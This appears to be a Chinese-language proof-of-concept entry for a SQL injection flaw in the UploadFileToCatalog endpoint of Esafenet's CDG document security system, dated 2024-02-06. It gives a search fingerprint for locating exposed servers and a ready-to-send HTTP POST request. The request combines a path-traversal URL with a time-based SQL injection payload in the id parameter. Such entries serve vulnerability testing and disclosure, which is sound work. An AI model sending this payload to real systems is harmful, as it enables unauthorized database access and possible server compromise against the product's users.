﻿# 亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞

> 更新时间：2024-02-06

> 漏洞编号：

> 漏洞说明：亿某通新一代电子文档安全管理系统（简称：CDG）是一款融合文档加密、数据分类分级、访问控制、关联分析、大数据分析、智能识别等核心技术的综合性数据智能安全产品。产品包括透明加密、智能加密、权限文档、数据分类分级、终端安全管理、文件外发管理、集团管控、数据安全网关、加解密接口中间件、U盘客户端十大核心组件，保护范围涵盖终端电脑（Windows、Mac和Linux系统平台）、智能终端（Android、IOS）以及各类应用系统（OA、知识管理、文档管理、项目管理、PDM等），能够对企业核心数据资产从生产、存储、流转、外发到销毁进行全生命周期保护。通过对“有意”、“无意”两种数据泄漏行为作统一防护，采用“事前主动防御，事中实时控制，事后及时追踪，全面防止泄密”的设计理念，配合身份鉴别、数据分类、密级标识、权限控制、应用集成、安全接入、风险预警以及行为审计等能力，全方位保障用户终端数据安全。

由于亿某通电子文档安全管理系统 UploadFileToCatalog接口的id参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限

> 漏洞特征：body="/CDGServer3/index.jsp"

> 验证脚本：HTTP

```
POST /CDGServer3/js/../policy/UploadFileToCatalog?fromurl=../user/dataSearch.jsp HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
 
id=1';WAITFOR DELAY '0:0:6'--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：


> 验证文件来源：亿赛通电子文档安全管理系统 UploadFileToCatalog SQL注入漏洞.poc
